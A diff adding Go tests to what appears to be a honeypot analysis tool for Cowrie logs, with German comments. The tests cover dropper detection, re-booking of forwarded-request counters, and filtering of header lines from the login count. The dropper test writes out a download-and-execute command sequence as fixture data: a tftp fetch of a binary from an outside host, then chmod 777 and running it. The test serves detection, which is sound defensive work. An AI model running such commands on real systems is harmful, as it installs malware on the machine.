@@ -7,6 +7,8 @@ import (
 	"bytes"
 	"compress/gzip"
 	"encoding/base64"
+	"encoding/json"
+	"net/http/httptest"
 	"slices"
 	"strings"
 	"testing"
@@ -224,5 +226,72 @@ func TestBefundWeiterleitungUndUpload(t *testing.T) {
 		sessEv(evAt(time.Time{}, "download", "ssh", "", 22, map[string]any{"filename": "sshd", "sha256": strings.Repeat("ab", 32), "upload": true}), "u1"))
 	if up.Stufe != stufeDownload || !hasTag(up, "file_upload") || !slices.Contains(up.Mitre, "T1105") {
 		t.Errorf("Upload: Stufe %d, Muster %v, MITRE %v", up.Stufe, up.Tags, up.Mitre)
+	}
+}
+
+// Laden und Starten in Einzelschritten auch in Bericht und Angriffskette.
+func TestBefundDropperBerichtUndKette(t *testing.T) {
+	evs := []*Event{sessEv(loginEv("telnet", "root", "root", map[string]any{"success": true}), "k1")}
+	for _, c := range []string{"cd /dev", "tftp -g -r x86_64 -l q 198.51.100.20", "chmod 777 q", "./q"} {
+		evs = append(evs, sessEv(svcCmd("telnet", c), "k1"))
+	}
+	for i, e := range evs {
+		e.SrcIP, e.TS = "203.0.113.5", time.Unix(1700000000+int64(i), 0)
+	}
+	r := BuildReport("203.0.113.5", evs, false)
+	if !slices.ContainsFunc(r.Tags, func(t TagHit) bool { return t.ID == "download_exec" }) {
+		t.Errorf("Bericht: %+v", r.Tags)
+	}
+	c := BuildChain(evs, false)
+	if c == nil || !slices.ContainsFunc(c.Nodes, func(n *ChainNode) bool { return n.ID == "pat:download_exec" }) {
+		t.Errorf("Kette ohne Dropper")
+	}
+}
+
+// Alte Stundenzähler: Weiterleitungen werden einmalig von "request" nach "forward" umgebucht.
+func TestBefundWeiterleitungenUmbuchen(t *testing.T) {
+	h := testHive(t)
+	hr := time.Now().UnixMilli() / 3600000
+	for i, d := range []string{`{"forward_to":"198.51.100.50:80"}`, `{"forward_to":"198.51.100.51:80"}`, `{"path":"/"}`} {
+		svc := "ssh"
+		if i == 2 {
+			svc = "http"
+		}
+		if _, err := h.st.db.Exec(`INSERT INTO events(ts, service, type, src_ip, data, country) VALUES(?, ?, 'request', '203.0.113.9', ?, 'NL')`, hr*3600000+int64(i), svc, d); err != nil {
+			t.Fatal(err)
+		}
+	}
+	h.st.db.Exec(`INSERT INTO hourly(hour, service, type, country, cnt) VALUES(?, 'ssh', 'request', 'NL', 2), (?, 'http', 'request', 'NL', 1)`, hr, hr)
+	rebookForwards(h.st)
+	rebookForwards(h.st) // zweiter Lauf ändert nichts
+	got := map[string]int64{}
+	rs, _ := h.st.db.Query(`SELECT service || ':' || type, cnt FROM hourly WHERE hour = ?`, hr)
+	for rs.Next() {
+		var k string
+		var n int64
+		rs.Scan(&k, &n)
+		got[k] = n
+	}
+	rs.Close()
+	if got["ssh:forward"] != 2 || got["ssh:request"] != 0 || got["http:request"] != 1 {
+		t.Errorf("%v", got)
+	}
+}
+
+// Kennzahl "Logins angenommen": Kopfzeilen, die Cowrie vor 0.9.5 als Login annahm, zählen nicht.
+func TestBefundLoginsAngenommenOhneKopfzeilen(t *testing.T) {
+	h := testHive(t)
+	ts := time.Now().Add(-time.Hour).UnixMilli()
+	for _, u := range []string{"User-Agent: Mozilla/5.0", "root"} {
+		if _, err := h.st.db.Exec(`INSERT INTO events(ts, service, type, src_ip, username, data) VALUES(?, 'telnet', 'login', '203.0.113.9', ?, '{"success":true}')`, ts, u); err != nil {
+			t.Fatal(err)
+		}
+	}
+	rec := httptest.NewRecorder()
+	h.series(rec, httptest.NewRequest("GET", "/api/stats/series?range=24h", nil))
+	var s struct{ Totals map[string]int64 }
+	json.Unmarshal(rec.Body.Bytes(), &s)
+	if s.Totals["success"] != 1 {
+		t.Errorf("Logins angenommen: %d", s.Totals["success"])
 	}
 }
